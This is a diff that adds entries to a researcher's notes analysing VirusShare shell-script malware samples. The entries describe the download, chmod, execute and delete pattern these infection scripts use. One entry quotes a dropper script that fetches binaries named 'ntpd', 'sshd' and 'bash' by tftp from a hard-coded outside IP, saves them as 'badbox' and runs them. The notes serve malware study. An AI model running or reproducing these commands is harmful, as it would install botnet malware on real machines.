@@ -1172,12 +1172,87 @@ So it's another exception.
 
 # VirusShare_27515d028c3734d8a1f35bf48c20f877.sh 
 
+This is very similar to 
+> VirusShare_15643b394919f1dd4f7cc55aa1c48a9f.sh 
+
 
 ## Summary
+The only difference is this scrip "echo" more texts.
+
+
+# Notes
+This script may be a direct copy and slight modification of the previous script.
+
+
+------------------------------------------------------------------
+
+# VirusShare_bb6c127297c2643085fae54e24ee85ff.sh 
+
+
+## Summary
+This is a classical infection script. 
+1. download using `wget`
+2. change permission
+3. execute `./bash`. 
+4. download using `wget`
+5. change permission
+6. execute `./arts`
+
+
+## Notes
+1. `./bash` is a bit weird. 
+
+
+--------------------------------------------------------------------
+
+# VirusShare_d3e34ce713159d07414eae16d1105d41.sh
+
+This is sort of "boring" pattern.
+
+## Summary
+1. Find place `cd /tmp`
+2. download
+3. change permission
+4. execute
+5. remove
+5. repeat DW-CH-EXE-RM multiple times. 
+
+## Notes
+Classical DW-CH-EXE-RM pattern.
+
+
+--------------------------------------------------------------------
+
+# VirusShare_0e829416e4568738aa3df50ee4cab954.sh 
+
+This is the "boring" pattern.
+
+## Summary
+1. modify system resource variable
+2. copy executeable file `/bin/busybox`
+3. FP-DW-CP-CH-EXE
+
+
+## Notes
+1. It is not clear whether this file has been truncated or not.
+The last command is `ca` 
+It can  be the program `ca`, or the truncated program `cat`. 
+```shell
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 107.178.98.206;cat ntpd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 107.178.98.206;cat sshd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 107.178.98.206;cat openssh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 107.178.98.206;ca
+```
 
 
 
+--------------------------------------------------------------------
 
+# VirusShare_18bfcc3a22b75d09b77ceacd66900d00.sh 
+
+## Summary
 
 
 
